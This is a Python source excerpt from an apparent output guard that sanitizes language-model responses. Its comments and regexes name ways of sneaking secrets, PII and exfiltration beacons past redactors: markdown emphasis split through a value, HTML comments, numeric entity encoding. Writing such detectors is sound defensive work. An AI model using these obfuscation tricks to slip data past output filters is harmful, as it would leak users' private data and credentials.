_NUMERIC_ENTITY_RE = re.compile(r"&#(x[0-9a-fA-F]{1,6}|[0-9]{1,7});")
_ENT = _NUMERIC_ENTITY_RE.pattern
# TWO ReDoS-safe token passes (applied sequentially in neutralize_markdown_split_pii):
#  1) EMPHASIS/HTML — VALUE-ANCHORED (a value char precedes any separator), so a match fails
#     fast at a stray ``<`` and the bounded comment is never re-scanned per position.
#  2) ENTITIES — a plain run of value chars OR numeric entities. Value chars and ``&`` are
#     DISJOINT and the entity is bounded (no ``.*?``), so this is linear. The ``stripped !=
#     run`` guard in ``_sub`` leaves a run with no separator (a plain value) untouched.
# G52: numeric entities DECODE to a char (unlike the strip-to-nothing emphasis/HTML), so the
# run is decoded, not stripped, before re-detection.
# The value/separator repetitions are CAPPED (a real PII/secret value segment is short) so
# each match ATTEMPT is O(cap), not O(len) — otherwise a long value run wrapped by a
# separator char (``x<!-- <150KB> -->y``) makes re restart+backtrack O(n^2). Caps well above
# any real obfuscated value; longer runs are simply not one value.
# G79: the value-char runs are POSSESSIVE ({1,256}+). The separator always starts with a char
# DISJOINT from the value class ([*`<] vs the value alternation), so backtracking a value run can never
# help find a separator — greedy-without-giveback is semantically identical for any real match. Without
# possessive, a long value-char OUTPUT with no separator (which the output path does NOT length-cap
# like the 10k input cap) backtracks {1,256} at every start position -> O(256·n) (~1.5s for 200KB,
# a soft output-side DoS). Possessive makes each start O(1) -> ~140ms for 200KB.
# G91: the value class ALSO matches a NUMERIC HTML ENTITY (``&#49;``) so a value that is BOTH
# markdown-emphasis-split AND entity-encoded (``&#49;*&#50;*&#51;...`` — a markdown renderer strips the
# emphasis and the HTML parser then decodes the intact entities -> shows the value) is spanned as ONE
# run; _sub strips the emphasis and decodes the entities before re-detecting. The entity branch starts
# with ``&`` (disjoint from the [*`<] separator starts), so the possessive/disjoint ReDoS property holds.
_EMPH_HTML_TOKEN_RE = re.compile(
    rf"(?:[\w@.\-]|{_ENT}){{1,256}}+(?:{_RENDER_INVIS_SEP}{{1,64}}(?:[\w@.\-]|{_ENT}){{1,256}}+)+",
    re.DOTALL,
)
_ENTITY_TOKEN_RE = re.compile(rf"(?:[\w@.\-]|{_ENT}){{1,512}}")
_RENDER_INVIS_STRIP_RE = re.compile(_RENDER_INVIS_SEP, re.DOTALL)


def _decode_numeric_entities(s: str) -> str:
    """Decode numeric HTML entities (&#50; / &#x33;) to their char — a renderer does, so a
    value split with them reassembles. Only numeric entities (the obfuscation vector);
    named entities (&amp; etc.) are left alone to keep FP low."""
    def _one(m: "re.Match[str]") -> str:
        tok = m.group(1)
        try:
            cp = int(tok[1:], 16) if tok[0] in "xX" else int(tok)
        except ValueError:  # pragma: no cover
            return m.group(0)
        return chr(cp) if 0 <= cp <= 0x10FFFF else m.group(0)

    return _NUMERIC_ENTITY_RE.sub(_one, s)


def neutralize_markdown_split_pii(text: str) -> str:
    """Mask PII/secret hidden by INLINE markdown emphasis interleaved among its chars —
    the raw bytes evade the redactor but a markdown client renders the value. Only a run
    whose emphasis-stripped form is a PII/secret is masked, so benign markdown (``a_b_c``,
    ``**bold**``, `` `code` ``, ``2*3``) is left untouched (strict no-op)."""
    # Fast-path skip only when NONE of the render-invisible separators can be present:
    # markdown emphasis (* `) or an HTML tag/comment '<' (G51). ('_' alone never masks.)
    if not text or not ("*" in text or "`" in text or "<" in text or "&" in text):
        return text

    def _sub(m: "re.Match[str]") -> str:
        run = m.group(0)
        # A single PII/secret/credential value (even 3x-inflated by obfuscation markers) is
        # short; a very long run is never one value, so skip it — bounds the per-run detect
        # cost (no ReDoS on a pathological multi-KB run) with no loss of coverage.
        if len(run) > 512:
            return run
        # PIPELINE-0012 / output parity: already smart-masked shapes (j***@a***.com,
        # ***-**-6789, …) use asterisks as MASKING, not markdown emphasis. Stripping
        # them reconstructs a weak email and falsely triggers [PII_REDACTED].
        try:
            from patterns import contains_smart_redaction_markers as _smart_ok
        except ImportError:  # pragma: no cover
            from .patterns import contains_smart_redaction_markers as _smart_ok
        if _smart_ok(run):
            return run
        # G50/G51: strip render-invisible separators (emphasis + HTML comments/empty tags);
        # '_' stays literal (CommonMark). G52: then DECODE numeric HTML entities (they
        # render to a char, not nothing).
        stripped = _decode_numeric_entities(_RENDER_INVIS_STRIP_RE.sub("", run))
        # G50: also cover CREDENTIAL (bearer/api keys) + internal IP detectors — the
        # same interleaved-emphasis trick hides an obfuscated ``sk_live_**…**`` token or
        # ``10.**0**.0.5`` internal IP from the raw-text credential/IP checks.
        if stripped != run and (
            detect_pii(stripped) or detect_secrets(stripped)
            or detect_credential_exposure(stripped) or detect_ip_leakage(stripped)
        ):
            return "[PII_REDACTED]"
        return run

    try:
        out = _EMPH_HTML_TOKEN_RE.sub(_sub, text)   # pass 1: emphasis + render-invisible HTML
        out = _ENTITY_TOKEN_RE.sub(_sub, out)        # pass 2: numeric HTML entities
        return out
    except Exception:  # noqa: BLE001 - sanitizer must never break the egress
        return text


def sanitize_output_for_verdict(
    response_text: str,
    verdict: OutputVerdict,
    *,
    redact_pii_fn=None,
) -> str:
    """Apply the correct sanitization for an output-guard verdict action.

    G13: whatever category won the verdict, the egress is ALWAYS passed through
    :func:`neutralize_exfil_channels` FIRST as a defense-in-depth pass, so a
    data-exfiltration beacon can never ride out alongside (e.g.) a PII redact when
    the PII verdict was selected. Neutralize runs BEFORE core redaction so it sees
    the original (unmasked) URL — otherwise masking the payload first would hide
    the exfil signal and leave the auto-render intact. No-op on benign markdown/URLs.
    G35 adds a symmetric encoded-PII neutralization pass (HTML-entity / percent runs
    that decode to a PII/secret) so a laundered-output exfil can't ride out either.
    """
    neutralized = neutralize_exfil_channels(response_text)
    neutralized = neutralize_encoded_pii(neutralized)
    neutralized = neutralize_markdown_split_pii(neutralized)  # G44
    return _sanitize_output_core(neutralized, verdict, redact_pii_fn=redact_pii_fn)


def _sanitize_output_core(
    response_text: str,
    verdict: OutputVerdict,
    *,
    redact_pii_fn=None,
) -> str:
    """Category-specific sanitization for an output-guard verdict action."""
    threat = str(verdict.threat_type or "")
    action = str(verdict.action or "allow")
    # G13: an exfil-channel verdict is fixed by the wrapper's neutralize pass
    # (defang the beacon in place). Here just mask any incidental PII while keeping
    # the rest of the answer — never nuke the whole response to [REDACTED].
    if threat == "exfil_channel":
        return redact_pii_fn(response_text) if redact_pii_fn is not None else response_text
    if action == "rewrite":
        # Honor UI rewrite for ALL threat types (incl. pii/secret). Surgical
        # redact above only applies when action is redact/block-downgraded —
        # previously redactable categories ignored action==rewrite and always
        # surgically masked, so non-stream sanitize callers could never rewrite.
        return rewrite_output_response_text(
            threat,
            verdict.detail or None,
            original_text=response_text,
        )
    if action != "redact":
        return response_text
    if threat == "hallucination":
        return rewrite_output_response_text(
            threat,
            verdict.detail or None,
            original_text=response_text,
        )
    if threat in _REDACTABLE_OUTPUT_CATEGORIES:
        base = redact_pii_fn(response_text) if redact_pii_fn is not None else "[REDACTED]"
        spans = list(verdict.redaction_spans or []) + [
            str(v) for v in (verdict.matched_values or {}).values()
        ]
        return _mask_spans_typed(base, spans, threat)
    if threat == "ip_leakage":
        if redact_pii_fn is not None:
            return redact_pii_fn(response_text)
        return response_text
    if redact_pii_fn is not None:
        return redact_pii_fn(response_text)
    return "[REDACTED]"


def output_verdict_applies_to_delivered_text(
    verdict: OutputVerdict | None,
    delivered_text: str,
) -> bool:
    """True when at least one matched span appears in the bytes delivered to the client."""
    if verdict is None or verdict.action not in ("redact", "flag", "block"):
        return True
    matched = dict(getattr(verdict, "matched_values", None) or {})
    if not matched:
        return True
    delivered = delivered_text or ""
    return any(v and v in delivered for v in matched.values())


def coalesce_output_guard_verdict_for_delivery(
    verdict: OutputVerdict | None,
    *,
    delivered_text: str,
) -> OutputVerdict | None:
    """Downgrade false-positive redact/flag when detection is outside delivered content.

    The scan input can include reasoning/tool channels that are not returned to the
    client. A smart-masked echo of already-redacted input there must not mark the
    visible answer as redacted (noop redact on safety-classifier metadata).
    """
    if verdict is None or verdict.action not in ("redact", "flag"):
        return verdict
    if output_verdict_applies_to_delivered_text(verdict, delivered_text):
        return verdict
    try:
        from patterns import is_safety_classifier_output
    except ImportError:
        from .patterns import is_safety_classifier_output
    delivered = (delivered_text or "").strip()
    if is_safety_classifier_output(delivered):
        detail = (
            "Safety classifier metadata only; matched PII was not present in "
            "delivered model content."
        )
    else:
        detail = (
            "Matched PII/secret was outside delivered model content "
            "(non-user-visible channel)."
        )
    return OutputVerdict(detail=detail)


def output_guard_telemetry_meta(
    verdict: OutputVerdict,
    *,
    raw_output: str,
    sanitized_output: str,
) -> dict:
    """Shared telemetry fields for output-guard incidents."""
    redact_noop = (
        str(getattr(verdict, "action", "") or "").lower() == "redact"
        and (raw_output or "") == (sanitized_output or "")
    )
    return {
        "detail": verdict.detail,
        "response_snippet": raw_output,
        "raw_output": raw_output,
        "sanitized_output": sanitized_output,
        "guardrail_reasoning": verdict.detail,
        "matched_patterns": list(verdict.matched_patterns or []),
        # AUDIT-2: matched_values previously persisted the RAW matched PII/secret into
        # EnforcementEvent.metadata.extra.matched_values (a dict, so it escaped the
        # telemetry.py _TEXT_KEYS scrub). Mask each value here at the source — the
        # operator console still gets matched_patterns + a masked value, never raw PII.
        "matched_values": {k: _mask_value_for_detail(str(v)) for k, v in (verdict.matched_values or {}).items()},
        "output_snippet_truncated": bool(
            len(raw_output or "") >= 8000 or len(sanitized_output or "") >= 8000
        ),
        "full_output_scanned": True,
        "redact_noop": redact_noop,
    }
